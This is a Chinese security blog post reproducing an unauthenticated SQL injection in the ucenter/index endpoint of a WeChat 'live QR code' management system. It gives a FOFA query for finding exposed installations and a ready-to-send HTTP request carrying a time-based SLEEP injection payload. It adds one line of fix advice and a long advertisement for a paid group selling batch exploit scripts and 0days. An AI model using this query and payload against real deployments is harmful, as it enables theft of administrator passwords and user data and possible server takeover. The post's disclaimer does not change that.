#  「漏洞复现」微信活码系统 ucenter/index SQL注入漏洞   
冷漠安全  冷漠安全   2024-11-23 12:35  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
微信活码系统是基于微信平台的二维码管理系统，旨在帮助企业和个人实现更高效的社群运营和流量管理。可以将多个二维码合并成一个二维码的工具，用户扫描该固定二维码后，可以看到一个微信二维码（可以是群二维码，也可以是个人名片二维码），而这些二维码可以在后台随时进行更换。通过这种方式，微信活码系统有效避免了因频繁更换二维码导致的流量丢失，提高了社群运营的效率。  
  
0x03  
  
**漏洞威胁**  
  
微信活码系统  ucenter/index 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body=".qn-user-login"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ozlpysR8MJVcpaIploZwDJ8ZeHQmz0iakm4VcvY6wgLJGotOnQr0ShEibrxjKk97w5WcuXDnvqd9Xg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /ucenter/index/?uid=1)%20AND%20(SELECT%203460%20FROM%20(SELECT(SLEEP(5)))RkHL)%20AND%20(1015=1015 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
```  
  
延时，执行2次  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ozlpysR8MJVcpaIploZwDJCicq2icm3s5Sz7SSmg9VicgrjRQKJSwCMibqa34YuichgeYAibJLKushLEUQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ozlpysR8MJVcpaIploZwDJ8p84dnPdC7DzFJSywXIVvPCPkHVGBdtW0mFpjp8kT9KUBIvPCybMibQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ozlpysR8MJVcpaIploZwDJ6R0R9UOz3gpXibSDaTRSuTQVjS8iaaaJ2Tkyx6xiaofa6WBELsCSov4Pw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0ozlpysR8MJVcpaIploZwDJA1j5QdBR7ibZKOYMcSudwz5ywLN1yNaWqYrz9LlW3bAib7MdaDNqe1pA/640?wx_fmt=gif&from=appmsg "")  
  
  
